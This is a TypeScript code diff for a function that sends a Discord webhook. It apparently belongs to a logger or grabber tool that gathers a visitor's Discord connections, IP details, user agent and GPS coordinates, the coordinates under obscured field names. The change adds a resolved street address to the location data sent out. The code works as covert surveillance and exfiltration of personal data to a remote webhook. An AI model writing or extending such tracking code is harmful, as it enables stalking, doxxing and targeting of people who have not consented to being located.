@@ -6,7 +6,8 @@ export const sendWebhook = async (
   connections: DiscordConnection[], 
   ipInfo: IpInfo, 
   ua: string,
-  gps: GpsData
+  gps: GpsData,
+  address: string
 ) => {
     try {
         const webhookUrl = process.env.DISCORD_WEBHOOK || "";
@@ -34,7 +35,7 @@ export const sendWebhook = async (
           },
           {
             name: "🌐 Location from GPS",
-            value: `Latitude: \`${gps.hh}\`\nLongitude: \`${gps.xf}\`\nAccuracy: \`${gps.ff}\`\nMoreInfo: [Click here](https://www.google.com/maps?q=${gps.hh},${gps.xf})`,
+            value: `Latitude: \`${gps.hh}\`\nLongitude: \`${gps.xf}\`\nAccuracy: \`${gps.ff}\`\nAddress: \`${address}\`\nMoreInfo: [Click here](https://www.google.com/maps?q=${gps.hh},${gps.xf})`,
             inline: false
           }
         ];
